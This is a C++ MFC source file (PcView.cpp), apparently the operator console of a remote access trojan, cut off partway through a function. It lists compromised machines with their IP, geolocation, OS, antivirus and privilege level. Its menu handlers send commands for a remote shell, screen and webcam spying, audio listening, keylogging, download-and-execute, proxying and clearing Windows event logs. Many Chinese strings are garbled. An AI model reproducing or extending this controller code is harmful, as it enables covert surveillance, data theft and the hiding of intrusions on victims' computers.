// PcView.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "PcView.h"
#include "ClientView.h"
#include "MainFrm.h"
#include "Start.h"
#include "InputDlg.h"
#include "LogView.h"
#include "ChangeGroupDlg.h"
#include "AudioDlg.h"
#include "SystemDlg.h"
#include "LocalUpload.h"
#include "OpenProxy.h"
#include "PrankDlg.h"
#include "SetColor.h"
#include "Dialogbar.h"

extern CLogView* g_pLogView;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
extern CDialogbar * pInfoMation;
extern CClientView* g_pTabView;
extern CMainFrame* g_pFrame;
extern CIOCPServer* m_iocpServer;
extern SEU_QQwry *m_gQQwry;

extern LPBYTE lpFilePacket ;
extern LPBYTE lpShellPacket;
extern LPBYTE lpScreenPacket;
extern LPBYTE lpWebCamPacket;
extern LPBYTE lpAudioPacket ;
extern LPBYTE lpSystemPacket;
extern LPBYTE lpKeyboardPacket;
extern LPBYTE lpServicePacket;
extern LPBYTE lpRegeditPacket;
extern LPBYTE lpTextChatPacket;
extern LPBYTE lpProxyMapPacket;
extern int nFilePacketLength;
extern int nShellPacketLength;
extern int nScreenPacketLength;
extern int nWebCamPacketLength;
extern int nAudioPacketLength;
extern int nSystemPacketLength;
extern int nKeyboardPacketLength;
extern int nServicePacketLength;
extern int nRegeditPacketLength;
extern int nTextChatPacketLength;
extern int nProxyPacketLength;

typedef struct
{
	char	*title;
	int		nWidth;
}COLUMNSTRUCT;
COLUMNSTRUCT g_Column_Data[] = 
{
	{_T("����/����λ��"),       200 },//0
	{_T("WAN"),		        	130	},//1
	{_T("LAN"),		        	100	},//2
	{_T("������"),              100	},//3
//	{_T("�Կ��Դ�"),			90	},         //4 
	{_T("ϵͳ�汾"),			100	},//4 
	{_T("λ"),			       	45	},//5
	{_T("CPU"),		        	90  },//6
	{_T("�ڴ�"),	        	80  },//7
	{_T("Pin"),			     	45	},//8
	{_T("��Ƶ"),		      	40	},//9    //////////*{_T("�ڿ�״̬"),			60	},//11*/
	{_T("����ʱ��"),		   	100	},//10
	//{_T("��װʱ��"),		   	115	},                  //12    ////////	/*{_T("��ɫ���"),		   	88	},//14*/
	{_T("ɱ�����"),	        100 }, //11
	{_T("Ȩ��"),		        100	},//12
};

int	g_Column_Count = (sizeof(g_Column_Data) / 8);
/////////////////////////////////////////////////////////////////////////////
// CPcView

IMPLEMENT_DYNCREATE(CPcView, CXTPListView)

CPcView::CPcView()
{
	m_QQwry = m_gQQwry;
	m_nCount = 0;
}

CPcView::~CPcView()
{
/*
	int iWidth;
	CString str;
	for (int i = 0; i < g_Column_Count; i++)
	{
		str.Format("Width%d",i);
		iWidth = m_pListCtrl->GetColumnWidth(i);
		((CClientApp *)AfxGetApp())->m_IniFile.SetInt("MainHeader_Column_Width",str,iWidth);
	}*/
}


BEGIN_MESSAGE_MAP(CPcView, CXTPListView)
	//{{AFX_MSG_MAP(CPcView)
	ON_WM_SIZE()
	ON_WM_LBUTTONDOWN()
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(ID_MENUITEM_SELECT_ALL, OnMenuitemSelectAll)
	ON_COMMAND(ID_MENUITEM_CHANGE_GROUP, OnMenuitemChangeGroup)
	ON_COMMAND(ID_MENUITEM_LOGOFF, OnMenuitemLogoff)
	ON_COMMAND(ID_MENUITEM_FILEMANAGER, OnMenuitemFilemanager)
	ON_COMMAND(ID_MENUITEM_REBOOT, OnMenuitemReboot)
	ON_COMMAND(ID_MENUITEM_SHUTDOWN, OnMenuitemShutdown)
	ON_COMMAND(ID_MENUITEM_REMOTESHELL, OnMenuitemRemoteshell)
	ON_COMMAND(ID_MENUITEM_SCREENSPY, OnMenuitemScreenspy)
	ON_COMMAND(ID_MENUITEM_WEBCAM, OnMenuitemWebcam)
	ON_COMMAND(ID_MENUITEM_AUDIO_LISTEN, OnMenuitemAudioListen)
	ON_COMMAND(ID_MENUITEM_REMARK, OnMenuitemRemark)
	ON_COMMAND(ID_MENUITEM_OPEN_URL_SHOW, OnMenuitemOpenUrlShow)
	ON_COMMAND(ID_MENUITEM_OPEN_URL_HIDE, OnMenuitemOpenUrlHide)
	ON_COMMAND(ID_MENUITEM_UNINSTALL, OnMenuitemUninstall)
	ON_COMMAND(ID_MENUITEM_UNSELECT_ALL, OnMenuitemUnselectAll)
	ON_COMMAND(ID_MENUITEM_SYSTEM, OnMenuitemSystem)
	ON_COMMAND(ID_MENUITEM_DOWNEXEC, OnMenuitemDownexec)
	ON_COMMAND(ID_MENUITEM_LOCAL_UPLOAD, OnMenuitemLocalUpload)
	ON_COMMAND(ID_MENUITEM_FIND_PROCESS, OnMenuitemFindProcess)
	ON_COMMAND(ID_MENUITEM_FIND_WINDOW, OnMenuitemFindWindow)
	ON_COMMAND(ID_MENUITEM_CLEAN_FIND, OnMenuitemCleanFind)
	ON_COMMAND(ID_MENUITEM_COPY_IP, OnMenuitemCopyIp)
	ON_COMMAND(ID_MENUITEM_COPY_ALL, OnMenuitemCopyAll)
	ON_COMMAND(ID_MENUITEM_UPDATE_SERVER, OnMenuitemUpdateServer)
	ON_COMMAND(ID_MENUITEM_CHANGE_DLLINFO, OnMenuitemChangeDllinfo)
	ON_COMMAND(ID_MENUITEM_KEYBOARD, OnMenuitemKeyboard)
	ON_COMMAND(ID_MENUITEM_MESSAGEBOX, OnMenuitemMessagebox)
	ON_COMMAND(ID_MENUITEM_SAVE_IPLIST, OnMenuitemSaveIplist)
	ON_COMMAND(ID_MENUITEM_PROXY, OnMenuitemProxy)
	ON_COMMAND(ID_MENUITEM_SERVICEMANAGER, OnMenuitemServicemanager)
	ON_COMMAND(ID_MENUITEM_REGEDIT, OnMenuitemRegedit)
	ON_COMMAND(ID_MENUITEM_TEXT_CHAT, OnMenuitemTextChat)
	ON_COMMAND(ID_MENUITEM_PRANK, OnMenuitemPrank)
	ON_COMMAND(ID_MENUITEM_CLEANEVENT_ALL, OnMenuitemCleaneventAll)
	ON_COMMAND(ID_MENUITEM_CLEANEVENT_SYS, OnMenuitemCleaneventSys)
	ON_COMMAND(ID_MENUITEM_CLEANEVENT_SECURITY, OnMenuitemCleaneventSecurity)
	ON_COMMAND(ID_MENUITEM_CLEANEVENT_APP, OnMenuitemCleaneventApp)
	ON_COMMAND(ID_MENUITEM_PROXY_MAP, OnMenuitemProxyMap)
	ON_COMMAND(IDM_SETCOLOR, OnSetcolor)
	ON_NOTIFY_REFLECT(NM_CUSTOMDRAW, OnCustomDraw)
    ON_COMMAND(IDM_CHAT, OnChat)//���ӹ���
	//д������
	ON_COMMAND(IDM_START, OnStart)
	//WIN10����
ON_COMMAND(ID_Screen, OnScreen)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)

END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcView drawing

void CPcView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CPcView diagnostics

#ifdef _DEBUG
void CPcView::AssertValid() const
{
	CXTPListView::AssertValid();
}

void CPcView::Dump(CDumpContext& dc) const
{
	CXTPListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPcView message handlers
////////////////////////////////////////////////////////////////////////////////Listͼ��
typedef struct _MSGINFO {
	UINT msg;     
} MSGINFO;   

MSGINFO msgInfo[] = { 
	{IDI_ICON1 },{IDI_ICON2 },{IDI_ICON3 },{IDI_ICON4 },{IDI_ICON5 },
	{IDI_ICON6 },{IDI_ICON7 },{IDI_ICON8 },{IDI_ICON9 },{IDI_ICON10 },
	{IDI_ICON11 },{IDI_ICON12 },{IDI_ICON13 },{IDI_ICON14 },{IDI_ICON15 },
	{IDI_ICON16 },{IDI_ICON17 },{IDI_ICON18 },{IDI_ICON19 },{IDI_ICON20 },
	{IDI_ICON21 },{IDI_ICON22 },{IDI_ICON23 },{IDI_ICON24 },{IDI_ICON25 },
	{IDI_ICON26 },{IDI_ICON27 },{IDI_ICON28 },{IDI_ICON29 },{IDI_ICON30 },
	{IDI_ICON31 },{IDI_ICON32 },{IDI_ICON33 },{IDI_ICON34 },{IDI_ICON35 },
	{IDI_ICON36 },{IDI_ICON37 },{IDI_ICON38 },{IDI_ICON39 },{IDI_ICON40 },
	{IDI_ICON41 },{IDI_ICON42 },{IDI_ICON43 },{IDI_ICON44 },{IDI_ICON45 },
	{IDI_ICON46 },{IDI_ICON47 },{IDI_ICON48 },{IDI_ICON49 },{IDI_ICON50 },
	{IDI_ICON51 },{IDI_ICON52 },{IDI_ICON53 },{IDI_ICON54 },{IDI_ICON55 },
	{IDI_ICON56 },{IDI_ICON57 },{IDI_ICON58 },{IDI_ICON59 },{IDI_ICON60 },
	{IDI_ICON61 },{IDI_ICON62 },{IDI_ICON63 },{IDI_ICON64 },{IDI_ICON65 },
	{IDI_ICON66 },{IDI_ICON67 },{IDI_ICON68 },{IDI_ICON69 },{IDI_ICON70 },
	{IDI_ICON71 },{IDI_ICON72 },{IDI_ICON73 },{IDI_ICON74 },{IDI_ICON75 },
	{IDI_ICON76 },{IDI_ICON77 },{IDI_ICON78 },{IDI_ICON79 },{IDI_ICON80 },
	{IDI_ICON81 },{IDI_ICON82 },{IDI_ICON83 },{IDI_ICON84 },{IDI_ICON85 },
	{IDI_ICON86 },{IDI_ICON87 },{IDI_ICON88 },{IDI_ICON89 },{IDI_ICON90 },
	{IDI_ICON91 },{IDI_ICON92 },{IDI_ICON93 },{IDI_ICON94 },{IDI_ICON95 },
	{IDI_ICON96 },{IDI_ICON97 },{IDI_ICON98 },{IDI_ICON99 },{IDI_ICON100 },
	{IDI_ICON101 },{IDI_ICON102 },{IDI_ICON103 },{IDI_ICON104 },{IDI_ICON105 },
	{IDI_ICON106 },{IDI_ICON107 },{IDI_ICON108 },{IDI_ICON109 },{IDI_ICON110 },
	{IDI_ICON111 },{IDI_ICON112 },{IDI_ICON113 },{IDI_ICON114 },{IDI_ICON115 },
	{IDI_ICON116 },{IDI_ICON117 },{IDI_ICON118 },{IDI_ICON119 },{IDI_ICON120 },
	{IDI_ICON121 },{IDI_ICON122 },{IDI_ICON123 },{IDI_ICON124 },{IDI_ICON125 },
	{IDI_ICON126 },{IDI_ICON127 },{IDI_ICON128 },{IDI_ICON129 },{IDI_ICON130 },
	{IDI_ICON131 },{IDI_ICON132 },{IDI_ICON133 },{IDI_ICON134 },{IDI_ICON135 },
	{IDI_ICON136 },{IDI_ICON137 },{IDI_ICON138 },{IDI_ICON139 },{IDI_ICON140 },
	{IDI_ICON141 },{IDI_ICON142 },{IDI_ICON143 },{IDI_ICON144 },{IDI_ICON145 },
	{IDI_ICON146 },{IDI_ICON147 },{IDI_ICON148 },{IDI_ICON149 },{IDI_ICON150 },
	{IDI_ICON151 },{IDI_ICON152 },{IDI_ICON153 },{IDI_ICON154 },{IDI_ICON155 },
	{IDI_ICON156 },{IDI_ICON157 },{IDI_ICON158 },{IDI_ICON159 },{IDI_ICON160 },
	{IDI_ICON161 },{IDI_ICON162 },{IDI_ICON163 },{IDI_ICON164 },{IDI_ICON165 },
	{IDI_ICON166 },{IDI_ICON167 },{IDI_ICON168 },{IDI_ICON169 },{IDI_ICON170 },
	{IDI_ICON171 },{IDI_ICON172 },{IDI_ICON173 },{IDI_ICON174 },{IDI_ICON175 },
	{IDI_ICON176 },{IDI_ICON177 },{IDI_ICON178 },{IDI_ICON179 },{IDI_ICON180 },
	{IDI_ICON181 },{IDI_ICON182 },{IDI_ICON183 },{IDI_ICON184 },{IDI_ICON185 },
	{IDI_ICON186 },{IDI_ICON187 },{IDI_ICON188 },{IDI_ICON189 },{IDI_ICON190 },
	{IDI_ICON191 },{IDI_ICON192 },{IDI_ICON193 },{IDI_ICON194 },{IDI_ICON195 },
	{IDI_ICON196 },{IDI_ICON197 },{IDI_ICON198 },{IDI_ICON199 },{IDI_ICON200 },
	{IDI_ICON201 },{IDI_ICON202 },{IDI_ICON203 },{IDI_ICON204 },{IDI_ICON205 },
	{IDI_ICON206 },{IDI_ICON207 },{IDI_ICON208 }
}; 
/////////////////////////////////////////////////////////////////////////////

void CPcView::OnInitialUpdate() 
{
	CXTPListView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	m_pListCtrl = &GetListCtrl();
	
	I_ImageList.Create(20, 16, ILC_COLOR32|ILC_MASK,10, 0);
	HICON hIcon = NULL;	// ����Ϊ����ͼ����Դ		
	int Icot = sizeof(msgInfo)/sizeof(MSGINFO);
	for(int t=0; t<Icot; t++)
	{ 
		int Htms = msgInfo[t].msg;
		hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(Htms), IMAGE_ICON, 28, 14, 0);
		I_ImageList.Add(hIcon);
		DestroyIcon(hIcon); 
	}
	ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);  //���õ��Ĳ���ϵͳ��ͼ���б�ؼ�����
	m_pListCtrl->SetExtendedStyle(LVIF_PARAM |LVS_EX_FULLROWSELECT |LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);
	
	int iWidth;
	CString str;
	for (int i = 0; i < g_Column_Count; i++)
	{
		str.Format("Width%d",i);
		iWidth = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("MainHeader_Column_Width", str, g_Column_Data[i].nWidth);
		
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, iWidth);
	}	
	
	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
	m_header.EnablePopupMenus(FALSE);
   	EnableControls(FALSE);
	ModifyDrawStyle(XTTHEME_WINXPTHEMES, 4);
	ModifyDrawStyle(HDR_XTP_HOTTRACKING, TRUE);
	ModifyDrawStyle(XTTHEME_HOTTRACKING, TRUE);	
    EnableUserSortColor(true);
}

BOOL CPcView::PreCreateWindow(CREATESTRUCT& cs) 
{
	// TODO: Add your specialized code here and/or call the base class
	cs.style |= LVS_REPORT;
	return CXTPListView::PreCreateWindow(cs);
}

void CPcView::ModifyDrawStyle(UINT uFlag, BOOL bRemove)
{
	CXTHeaderCtrlTheme* pTheme = m_header.GetTheme();
	if (pTheme)
	{
		DWORD dwStyle = pTheme->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme->SetDrawStyle(dwStyle, &m_header);
		m_header.RedrawWindow();
	}
}

void CPcView::EnableControls(BOOL bRedraw)
{
	XTOSVersionInfo()->IsWinXPOrGreater();
	XTOSVersionInfo()->IsWinXPOrGreater();
	
	if (bRedraw)
	{
		RedrawWindow(NULL, NULL, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);
	}
}
COLORREF   m_crTextBk , m_clrText; 
void CPcView::OnCustomDraw(NMHDR* pNMHDR, LRESULT* pResult) 
{ 
	
	NMLVCUSTOMDRAW* pLVCD = (NMLVCUSTOMDRAW*)(pNMHDR); 
	*pResult = CDRF_NEWFONT; 
	if ( pLVCD->nmcd.dwDrawStage==CDDS_PREPAINT) 
	{ 
		*pResult = CDRF_NOTIFYITEMDRAW; 
	} 
	else if ( pLVCD->nmcd.dwDrawStage == CDDS_ITEMPREPAINT )  
	{
		
		int nItem = static_cast<int> (pLVCD->nmcd.dwItemSpec); 	
		CString str = m_pListCtrl->GetItemText(nItem ,13); 
		CString szColor = m_pListCtrl->GetItemText(nItem ,13); 
		bool bDBImplFail = false;
		if (str.Find(_T("Yes")) == 0) 
		{
			m_clrText  =  RGB(255,0,0);
		}
		else 
		{
			m_clrText  =  RGB(255,0,0);//��ɫ
		} 
		if (szColor.Find(_T("Red")) == 0)
		{ 
			m_clrText  =  RGB(255, 0, 0) ; // ��ɫ
		}
		if (szColor.Find(_T("Blank")) == 0)
		{ 
			m_clrText  =  RGB(0, 0, 0) ; // ��ɫ
		}
		if (szColor.Find(_T("Green")) == 0)
		{ 
			m_clrText  =  RGB(0, 255, 0) ; // ��ɫ
		}
		if (szColor.Find(_T("Purple")) == 0)
		{ 
			m_clrText  =  RGB(160, 32, 240) ; // ��ɫ
		}
		
		
		pLVCD->clrText = m_clrText; 	
		*pResult = CDRF_DODEFAULT; 
	} 
}

LRESULT CPcView::OnAddToList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;

	if (pContext == NULL)
		return -1;

	CString	 strOS,strToolTipsText,strLogText;
    int i;
	try
	{
		
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		int nCnt = m_pListCtrl->GetItemCount();	
		
		CString	str;
		m_nCount++;
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		
		if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
		{
			str=m_QQwry->IPtoAdd(IPAddress);
		}
		else
		{
			str = "δ�ҵ�IP���ݿ�";
		}
		//		i = m_pListCtrl->InsertItem(nCnt, str, LoginInfo->bIsWebCam ? 0 : 1 );
		//����
		int countryno=FindCountry(str);
		i = m_pListCtrl->InsertItem(nCnt, str, countryno);//ʹ��ָ��ͼ��
		m_pListCtrl->SetItemText(i, 0, str);

		// ����IP

		m_pListCtrl->SetItemText(i, 1, IPAddress);
		
		// ����IP
		m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));
		
		// ������
		m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);

		// ϵͳ
		////////////////////////////////////////////////////////////////////////////////////////
		//����ϵͳ
		char *pszOS = NULL;
		if (LoginInfo->dwMajorVer <= 4 )
		{
			pszOS = "NT";
			g_pFrame->nOSCount[0]++;
		}
		if ( LoginInfo->dwMajorVer == 5 && LoginInfo->dwMinorVer == 0 )
		{
			pszOS = "2000";
			g_pFrame->nOSCount[1]++;
		}
		if ( LoginInfo->dwMajorVer == 5 && LoginInfo->dwMinorVer == 1 )
		{
			pszOS = "XP";
			g_pFrame->nOSCount[2]++;
		}
		if ( LoginInfo->dwMajorVer == 5 && LoginInfo->dwMinorVer == 2 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "2003";
				g_pFrame->nOSCount[3]++;
			}
			else
			{
				pszOS = "2003R2";
				g_pFrame->nOSCount[3]++;
			}
		}
		if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 0 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "Vista";
				g_pFrame->nOSCount[4]++;
			}
			else
			{
				pszOS = "2008";
				g_pFrame->nOSCount[5]++;
			}
		}
		if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 1 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "7";
				g_pFrame->nOSCount[6]++;
			}
			else
			{
				pszOS = "2008 R2";
				g_pFrame->nOSCount[5]++;
			}
		}
		if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 2 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "8";
				g_pFrame->nOSCount[7]++;
			}
			else
			{
				pszOS = "2012";
				g_pFrame->nOSCount[8]++;
			}
		}
		if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 3 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "8.1";
				g_pFrame->nOSCount[7]++;
			}
			else
			{
				pszOS = "2012 R2";
				g_pFrame->nOSCount[8]++;
			}
		}
		
		if ( LoginInfo->dwMajorVer == 10 && LoginInfo->dwMinorVer == 0 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "10";
				g_pFrame->nOSCount[9]++;
			}
			else
			{
				pszOS = "2016";
				g_pFrame->nOSCount[10]++;
			}
		}

		strOS.Format
			(
			"Win %s SP%d",  //Build %d
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor
//			LoginInfo->dwBuildNumber
			);
		lstrcpy(pContext->szOnlinePass,LoginInfo->szLionPass); //����ͨѶ��Կ
		/////////�Կ�
// 		CString strGraphics,strMem;
// 		strGraphics.Format(LoginInfo->szGraphics);
// 		strMem.Format(("  ->�Դ�( %d MB)"),LoginInfo->Memory7);
// 		
// 		m_pListCtrl->SetItemText(i, 4, strGraphics+strMem);
////////////////////////////////ϵͳ�汾
		m_pListCtrl->SetItemText(i, 4, strOS);

		if(LoginInfo->bIsWow64)	
			str = " 64";
		else
			str = " 32";
		m_pListCtrl->SetItemText(i, 5, str);

		// CPU
		m_pListCtrl->SetItemText(i, 6, LoginInfo->CPUClockMhz);

		// �ڴ��С
		str.Format("%.2fGB",(float)LoginInfo->dwMemSize/1024);
		m_pListCtrl->SetItemText(i, 7, str);

		// ping
		str.Format("%d", LoginInfo->dwSpeed);
		m_pListCtrl->SetItemText(i, 8, str);

		// ��Ƶ״̬
		if (!LoginInfo->bIsWebCam)
			str = "��";
		else
			str.Format("��",LoginInfo->bIsWebCam);
		m_pListCtrl->SetItemText(i, 9, str);


		SYSTEMTIME sys;   
		GetLocalTime( &sys );
		str.Format( "%02d:%02d %02d/%02d"  
			,sys.wHour,sys.wMinute
			,sys.wMonth,sys.wDay   
			);  

		m_pListCtrl->SetItemText(i, 10, str);

		// ɱ�����
		str.Format("%s", LoginInfo->Virus);
		m_pListCtrl->SetItemText(i, 11, str);
	//	m_pListCtrl->SetItemText(i, 12, LoginInfo->szInstallTime);

		//��ɫ���
	//	m_pListCtrl->SetItemText(i,14,LoginInfo->lpColor);
		/////////////
		//�û�
		if (LoginInfo->bIsActive)
			m_pListCtrl->SetItemText(i, 12, _T("SYSTEM"));
		else
			m_pListCtrl->SetItemText(i, 12, _T("Administrator"));

		////////////
// 		if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
// 		{
//             //����λ��
// 			str = m_QQwry->IPtoAdd(IPAddress);
// 			m_pListCtrl->SetItemText(i, 13, str);
// 			strToolTipsText += _T("\nArea : ");
// 			strToolTipsText += str;
// 		}
// 		else
// 		{
// 			m_pListCtrl->SetItemText(i, 13,  _T("�޴������ݿ�"));
// 		}




		strToolTipsText.Format("���� : %s\n����  : %s\n��ַ  : %s\nϵͳ   : %s\nGroup: %s", 
		LoginInfo->HostName, LoginInfo->CPUClockMhz, IPAddress, strOS, LoginInfo->UpGroup);

		strLogText.Format( "��������: [%s]  -   ϵͳ:[%s]  -   ����λ��:[%s]  -   ɱ�����:[%s]",m_pListCtrl->GetItemText( i, 1 ),m_pListCtrl->GetItemText( i, 4 ),m_pListCtrl->GetItemText( i, 0 ),m_pListCtrl->GetItemText( i, 11 ));
		g_pLogView->InsertLogItem(strLogText, 0, 1);

		// ָ��Ψһ��ʶ
		m_pListCtrl->SetItemData(i, (DWORD) pContext);

		if (!((CClientApp *)AfxGetApp())->m_bIsDisablePopTips)
			g_pFrame->ShowToolTips(strToolTipsText);


		if (!((CClientApp *)AfxGetApp())->m_bIsWarning_Tone)
		{
			PlaySound(MAKEINTRESOURCE(IDR_WAVE_LOGIN),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
		}

    	g_pTabView->UpDateNumber();
		g_pFrame->ShowConnectionsNumber();

	}
	catch(...)
	{
		OutputDebugString("\r\n-------------------�����������ʧ��-------------------\r\n");
 		m_pListCtrl->DeleteItem(i);
	}
	return 0;
}

int CPcView::FindCountry(CString local)
{
	
	CString country[]={
		"�й�","����������","����������","������","����͢","��������������","������","����","�����ݽ�","����",
			"���������","������","��ɳ����","������","������","����ϺͰͲ���","�µ���","�Ĵ�����","����","�ͰͶ�˹",
			"�Ͳ����¼�����","�͹���","�ͻ�˹̹","������","����˹̹","����","������","����","�׶���˹","��������",
			"��������Լ��֯","����","����ʱ","����","����","��˹���Ǻͺ�����ά��","����ά��","��������","����","�����ɷ���",
			"��¡��","����","���������","����","�¹�","������","�����ǹ���Э��","�������ҹ�Э","���","�������",
			"�������","����˹","��϶��","����������","����","��ٸ�","���ɱ�","쳼�","����","��ý�",
			"�Ա���","�չ�(��)","�չ�","���ױ���","��˹�����","�����ɴ�","��³����","�Ű�","������","��Э",
			"������˹̹","����","����","����","�鶼��˹","�����˹","������","������˹˹̹","������","�����Ǳ���",
			"���ձȺ���ͬ��","���ô�","����","����","����կ","�ݿ�","��Ͳ�Τ","����¡","������","��Ħ��",
			"���ص���","������","���޵���","������","����ά��","������","����","�����","������","���ȹ���",
			"������","���Ϲ�","��֧��ʿ��","¬ɭ��","¬����","��������","����˹��","�������","�����","����ά",
			"��������","����","�����","���ܶ�Ⱥ��","ë����˹","ë��������","����","����������֯","�ɹ�","�ϼ���",
			"��³","�ܿ�������������","���","Ħ������","Ħ���","Ħ�ɸ�","Īɣ�ȿ�","ī����","���ױ���","�Ϸ�",
			"�³","�Ჴ��","�������","���ն�","��������","Ų��","ŷ������","����","������","�ձ�",
			"���","��ʿ","�����߶�","����ά��","��������","���ڼӶ�","����·˹","�����","ɳ�ذ�����","ʥ��������������",
			"ʥ���ĺ���ά˹","ʥ¬����","ʥ����ŵ","ʥ��ɭ�غ͸����ɶ�˹","˹������","˹�工��","˹��������","˹��ʿ��","�յ�","������",
			"������Ⱥ��","������","������˹̹","̫ƽ��ͬ��","̩��","̹ɣ����","����","�������Ͷ�͸�","ͻ��˹","ͼ��¬",
			"������","������˹̹","��Ŭ��ͼ","Σ������","ί������","����","�ڸɴ�","�ڿ���","������","���ȱ��˹̹",
			"������","����Ħ��","ϣ��","���","�¼���","������","������","������","�����","��������",
			"Ҳ��","������","����","��ɫ��","�����","ӡ��","ӡ��������","Ӣ����","Ӣ��","Լ��",
			"Խ��","�ޱ���","է��","����","�з�","̨��ʡ","�������",
			"�Ҳ���IP���ݿ�"};
		
		int i;
		CString str;
		int len = strlen(local);
		for(i=0; i<len; i++)
		{
			if(local[i] == ' ')
			{
				break;
			}
		}
		CString strlocal = local.Left(i);  //��ȡǰ���ַ���
		
		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //�ȱȽ��ַ��������Ƿ�ɹ�
		{
			str = country[i];
			if (strstr(strlocal,str)!=NULL)
			{
				int s0 = strlen(strlocal);
				int s1 = strlen(str);
				if(s0==s1)
					return i;
			}
		}
		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //�ٱȽ��ַ�
		{
			str = country[i];
			if (strstr(strlocal,str)!=NULL)
			{
				if (strstr(strlocal,"���ɹ�")!=NULL)
					return 0;
				return i;
			}
		}
		return 0;
}

void CPcView::SendSelectCommand(PBYTE pData, UINT nSize)
{       
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		// ���ͻ���������б����ݰ�
		m_iocpServer->Send(pContext, pData, nSize,FALSE);
		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}

void CPcView::OnMenuitemChangeGroup() 
{
	// TODO: Add your command handler code here
	CChangeGroupDlg m_group;
	if ( m_group.DoModal() == IDOK )
	{	
		int	nPacketLength = m_group.strGroup.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, m_group.strGroup.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		
		CString strTemp, strGroupName;
		CPcView* pView = NULL;
		int count = g_pTabView->m_wndTabControl.GetItemCount();
		for ( int i = 0; i < count; i++ )
		{
			strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if ( n > 0)
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			if ( strGroupName == m_group.strGroup )
			{
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
				break;
			}
		}
		if ( pView == NULL )
		{
			strTemp.Format( _T("%s(0)"), m_group.strGroup );
			g_pTabView->AddGroup( strTemp );
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(count)->GetHandle()));
			pView->OnInitialUpdate();
		}
		
		POSITION pos;
		for(; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
		{
			int m = m_pListCtrl->GetNextSelectedItem(pos);
			
			CString	str;
			ClientContext	*pContext = (ClientContext *)(m_pListCtrl->GetItemData(m));

			/////////////////�޸��ı���������ʾBUG/////////////////////////////////////////////////////////
			sockaddr_in sockAddr;
			memset(&sockAddr, 0, sizeof(sockAddr));
			int nSockAddrLen = sizeof(sockAddr);
			BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*) & sockAddr, &nSockAddrLen);
